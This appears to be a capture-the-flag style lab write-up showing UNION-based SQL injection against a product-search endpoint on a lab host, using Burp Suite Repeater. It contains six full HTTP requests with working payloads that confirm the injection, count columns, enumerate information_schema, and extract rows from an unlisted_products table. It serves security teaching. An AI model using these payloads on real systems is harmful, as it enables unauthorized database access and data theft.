# 🔐 UNION-Based SQL Injection — Burp Suite Step-by-Step

## 📌 Lab Overview

This lab demonstrates how to identify and exploit a **UNION-based SQL Injection** vulnerability in a product-search functionality using **Burp Suite Repeater**.

The objective is to progressively enumerate the database and identify the hidden path.

> **Environment:** Authorized security lab
> 
> 
> **Tool:** Burp Suite
> 
> **Component:** Repeater
> 
> **Target:** `10.48.189.3:8000`
> 
> **Vulnerable Endpoint:** `/searchproducts.php`
> 
> **Parameter:** `search`
> 

---

# 1. Attack Methodology

The complete workflow is:

```
Browser
   │
   ▼
Capture Request with Burp Proxy
   │
   ▼
Send Request to Repeater
   │
   ▼
Confirm SQL Injection
   │
   ▼
Determine Column Count
   │
   ▼
Enumerate Tables
   │
   ▼
Enumerate Columns
   │
   ▼
Identify unlisted_products
   │
   ▼
Extract Records
   │
   ▼
Identify Hidden Path
```

---

# 2. Capture the Request in Burp Suite

Open **Burp Suite**.

Make sure **Proxy → Intercept** is enabled.

Then perform a search in the application.

Burp should capture a request similar to:

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=test
```

The important part is:

```
search=phone
```

This is the parameter being tested.

---

# 3. Send the Request to Repeater

Right-click the intercepted request and select:

```
Send to Repeater
```

Then navigate to:

```
Repeater
```

You can now modify the request repeatedly without having to capture a new request each time.



# 4. Burp Repeater Request Progression

the requests sent through Repeater were:

### Request 1 — SQL Injection Test

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search='
```

<img width="1274" height="682" alt="Screenshot 2026-09-17 at 2 45 10 PM" src="https://github.com/user-attachments/assets/c93f793b-4000-4aef-8f79-298a17168a91" />


---



### Request 2 — Column Count

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,3,4,5 -- //
```
<img width="1276" height="715" alt="Screenshot 2026-09-17 at 2 55 15 PM" src="https://github.com/user-attachments/assets/26135757-2363-4cc5-b305-9b8ae76befff" />



---

### Request 3 — Table Enumeration

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.tables -- //
```

<img width="1273" height="685" alt="Screenshot 2026-09-17 at 2 57 45 PM" src="https://github.com/user-attachments/assets/4d379a53-df75-43a8-a3ab-287ddf12c6c0" />



---

### Request 4 — Database Structure

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_schema,table_name,1
FROM information_schema.columns
WHERE table_schema=database() -- //
```

<img width="1272" height="680" alt="Screenshot 2026-09-17 at 3 00 07 PM" src="https://github.com/user-attachments/assets/e78ec665-f045-498c-9658-c2fba5b20f89" />


---

### Request 5 — `unlisted_products` Columns

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT 1,2,table_name,column_name,1
FROM information_schema.columns
WHERE table_schema=database()
  AND table_name='unlisted_products' -- //
```

<img width="1275" height="716" alt="Screenshot 2026-09-17 at 3 01 34 PM" src="https://github.com/user-attachments/assets/97eac53e-7b77-4975-8e57-f72784bdbc94" />



---

### Request 6 — Extract Data

```
POST /searchproducts.php HTTP/1.1
Host: 10.48.189.3:8000
Content-Type: application/x-www-form-urlencoded

search=' UNION SELECT description,id,price,product_name,product_type
FROM unlisted_products -- //
```

<img width="1275" height="648" alt="Screenshot 2026-09-17 at 3 04 07 PM" src="https://github.com/user-attachments/assets/503c466e-49e7-425f-9c98-43017c25bcf0" />


---


